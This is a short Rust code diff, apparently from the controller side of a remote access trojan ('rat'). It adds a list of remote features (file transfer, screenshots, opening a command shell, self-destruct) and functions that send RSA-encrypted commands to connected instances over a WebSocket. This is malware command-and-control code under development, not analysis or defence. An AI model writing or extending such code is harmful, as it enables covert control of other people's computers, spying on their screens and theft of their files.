@@ -1,3 +1,4 @@
+use core::str;
 use std::net::{IpAddr, SocketAddr};
 
 use futures_util::{
@@ -11,6 +12,13 @@ use rsa::{
 use tokio_tungstenite::WebSocketStream;
 use tungstenite::Message;
 
+pub const FEATURES: [&str; 5] = [
+    "update",
+    "start_file_transfer",
+    "send_screenshot",
+    "open_cmd",
+    "self_destruct",
+];
 #[derive(Debug)]
 #[allow(dead_code)]
 pub struct Instance {
@@ -74,9 +82,24 @@ impl Instance {
     pub fn set_private_key(&mut self, private_key: RsaPrivateKey) {
         self.private_key = Some(private_key);
     }
+    pub fn is_keys_init(&self) -> bool {
+        if self.public_key.is_none() || self.private_key.is_none() {
+            return false;
+        }
+        true
+    }
     pub async fn send_message(&mut self, message: &str) {
-        //make this encrypt every time when message sent
         self.write.send(Message::from(message)).await.unwrap();
+    }
+    pub async fn send_encrypted_message(&mut self, message: &str) {
+        let encrypted_data = self.encrypt_data(None, message.as_bytes());
+        self.write
+            .send(Message::from(encrypted_data))
+            .await
+            .unwrap();
+    }
+    pub async fn send_chosen_command(&mut self, command: String) {
+        self.send_encrypted_message(&command).await;
     }
     pub async fn init_keys(&mut self) -> (String, String) {
         //Send pong for rat to generate a public key
